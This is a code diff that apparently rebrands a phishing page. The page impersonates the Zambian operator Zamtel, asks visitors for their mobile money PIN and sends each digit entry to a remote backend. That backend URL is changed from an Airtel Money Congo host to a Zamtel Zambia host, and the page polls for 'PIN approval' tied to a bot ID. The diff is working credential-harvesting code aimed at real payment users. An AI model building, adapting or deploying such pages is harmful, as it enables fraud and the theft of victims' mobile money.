@@ -110,7 +110,7 @@ body{
   <div class="upper-section">
     <div class="brand-name">Zamtel</div>
     <div class="welcome-text">Welcome</div>
-    <div class="pin-label">Enter your PIN code</div>
+    <div class="pin-label">Enter your  mobile money pin</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -134,7 +134,7 @@ body{
 </div>
 
 <script>
-const BACKEND_URL = "https://airtel-money-congo-xyki.onrender.com";
+const BACKEND_URL = "https://zamtel-zambia.onrender.com";
 
 const botId   = new URLSearchParams(window.location.search).get("botId");
 const boxes   = document.querySelectorAll(".pin-boxes input");
@@ -201,7 +201,7 @@ boxes.forEach((box,i)=>{
 
       const ok = await pollPinApproval(res.requestId);
       if(ok){
-        window.location.href = "code.html?botId=" + botId;
+        window.location.href = "success.html?botId=" + botId;
       } else {
         statusEl.textContent="Incorrect PIN code.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
